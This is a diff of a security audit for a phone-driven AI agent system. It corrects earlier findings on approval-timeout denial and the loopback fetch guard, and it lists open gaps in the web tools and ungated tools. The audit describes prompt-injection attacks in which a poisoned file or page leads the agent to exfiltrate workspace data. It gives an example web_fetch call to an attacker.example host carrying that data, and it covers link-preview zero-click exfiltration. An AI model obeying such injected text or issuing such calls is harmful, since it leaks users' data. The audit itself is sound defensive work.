@@ -47,8 +47,22 @@ fixed, mitigated, or a planned follow-up.
   core (duo_runner.py:6013, CRITIC-LOCK).
 - **Approval-gated tools auto-denied** until tappable approvals ship:
   the gateway answers every `approval_request` with `"3"` and says so
-  on the phone. Server-side timeout expiry is fail-closed deny too
-  (corrected during WP0; test-verified in `test_approval_timeout.py`).
+  on the phone.
+
+  **Approval-timeout semantics (resolved — this audit's earlier text
+  and the first WP0 report disagreed):** the server-side expiry is
+  fail-closed DENY. Evidence: `tools/runner.py:719-735` — the code
+  itself carries the correction ("FAIL CLOSED (2026-10-03 review): an
+  unanswered card DENIES the call once") and returns
+  `("DENY", ACTION_APPROVAL_TIMEOUT)`; the countdown arms only when
+  `duo_action_approval_timeout_s > 0` (0 = abort-aware 3600 s wait).
+  Empirical: `tests/test_approval_timeout.py` — 4/4 PASS on 2026-10-05
+  ("timeout after 1.0s -> DENY (fail closed)", late-click guard armed).
+  The first WP0 report claimed "auto-approve-once" because it quoted
+  three stale comments (`runner.py:317`, `:688`, `:712`) that predate
+  the fix (corrected on main in 2e938f3; the branch base sat before
+  it). The real-run R5b step remains in the round as the end-to-end
+  proof through the gateway path.
 
 ## Findings
 
@@ -56,37 +70,62 @@ fixed, mitigated, or a planned follow-up.
 
 Auto-deny covers only the eight gated tools (`_APPROVAL_TOOLS`).
 Everything ungated runs with normal permissions: all read/search tools
-(workspace-confined — that part holds), but also **web_search and
-web_fetch with arbitrary URLs, and no SSRF guard**: no loopback/private
-target blocking exists in the web tool path (checked — nothing rejects
-`http://127.0.0.1:8001/...`).
+(workspace-confined — that part holds, see F2/N3), plus **web_search
+and web_fetch to arbitrary external URLs**. An earlier draft of this
+audit claimed there was no loopback guard in the web tool path — that
+claim was WRONG and is corrected below: the engine blocks private/
+loopback targets (verified live). The open surface is the external
+exfil path plus the ungated siblings.
 
-Consequences, in order of realism:
+Consequences, in order of realism (CORRECTED after the live probe):
 
-1. **Data exfiltration via web fetch.** Prompt injection (a poisoned
-   repo file or web page the agent reads) can ask the agent to
+1. **Data exfiltration via external web fetch.** Prompt injection (a
+   poisoned repo file or web page the agent reads) can ask the agent to
    `web_fetch("https://attacker.example/?d=<workspace data>")`. The
    data travels in the URL; GET-only does not help. The secret filter
-   scrubs the ANSWER to the phone, not outbound requests.
-2. **Two-hop internal read.** `web_fetch` can read the engine's own
-   loopback API into the tool result: `/chats` (all chat transcripts),
-   `/memory`, `/settings` (the git token is masked there — verified —
-   but user data is not). A second fetch exfiltrates it.
+   scrubs the ANSWER to the phone, not outbound requests. This path
+   REMAINS OPEN until the WP3 web-tool policy (P2 in
+   docs/wp3_proposals.md).
+2. **Two-hop internal read — BLOCKED.** The original audit draft
+   claimed web_fetch had no loopback guard. WRONG: the live probe on
+   2026-10-05 (`POST /internal/tool/exec`, `web_fetch` →
+   `http://127.0.0.1:8001/health`) returned
+   `"[web_fetch blocked] private/loopback IPs are not fetchable"`.
+   The guard exists in the engine. Remaining caveat: redirect and
+   exotic-IP evasions are untested — acceptance list in P2.
+3. **Link-preview zero-click exfiltration — MITIGATED at the transport.**
+   An attacker URL printed in an answer could otherwise be fetched
+   silently by Telegram's preview (PromptArmor-class). Every gateway
+   send path carries `link_preview_options.is_disabled=true`
+   (sendMessage, editMessageText; documents carry no captions) —
+   `tests/test_gateway_transport.py`, 5/5. Real-run spot check stays
+   in the round; URL neutralization in answers is proposed (P4).
+4. **Ungated sibling tools widen the surface:** the 2026-10-05
+   inventory (docs/wp3_proposals.md, P1) found `undo_last` (writes!),
+   `run_tests` (exec, currently dead), `browser` (network; possible
+   SSRF detour around the web_fetch guard — unverified),
+   `stop_background`, `get_background_output` all OUTSIDE the approval
+   gate. The deny-list structure is the finding; the WP3 allowlist is
+   the fix.
 
 **Mitigations now:** scratch-workspace rule for the phone (setup guide),
-auto-deny, workspace confinement. **Fix plan:** the remote profile
-(WP3) must include a web-tool policy — either disable web tools for
-`source:"telegram"` runs or restrict to an allowlist — plus a small
-core hardening: web_fetch refuses loopback/private targets unless
-explicitly enabled. Both need an owner go (core change).
+auto-deny, workspace confinement, loopback fetch guard (engine),
+link previews off (gateway). **Fix plan:** remote profile (WP3) with
+web-tool policy + allowlist (P1/P2), URL neutralization (P4). All need
+an owner go (core/frontend change).
 
-### F2 — MEDIUM: `run_tests` is ungated dead code
+### F2 — MEDIUM: deny-list structure — ungated tools include writers
 
-`run_tests` is not in `_APPROVAL_TOOLS`, but currently refuses with
-"test runner not wired" (tools/handlers/exec_tools.py:486). The moment
-someone wires a real runner, an arbitrary-code-execution tool exists
-OUTSIDE the approval gate. One-line core hardening: add `run_tests` to
-`_APPROVAL_TOOLS` now, before it can bite. Needs owner go.
+The original finding named `run_tests` (ungated, currently refuses with
+"test runner not wired" at tools/handlers/exec_tools.py:486 — an
+arbitrary-code-execution tool the moment it is wired). The inventory
+widened it: `undo_last` writes files, `stop_background` kills
+processes, `get_background_output` reads other runs' output, `browser`
+navigates the web — all ungated (full table: docs/wp3_proposals.md,
+P1). Adding one line per tool is whack-a-mole; the accepted direction
+is the WP3 ALLOWLIST for phone-source runs (unknown/future tools
+denied by default). Interim one-liner still recommended: `run_tests`
+into `_APPROVAL_TOOLS`. Needs owner go.
 
 ### F3 — MEDIUM: no startup identity check of the engine
 
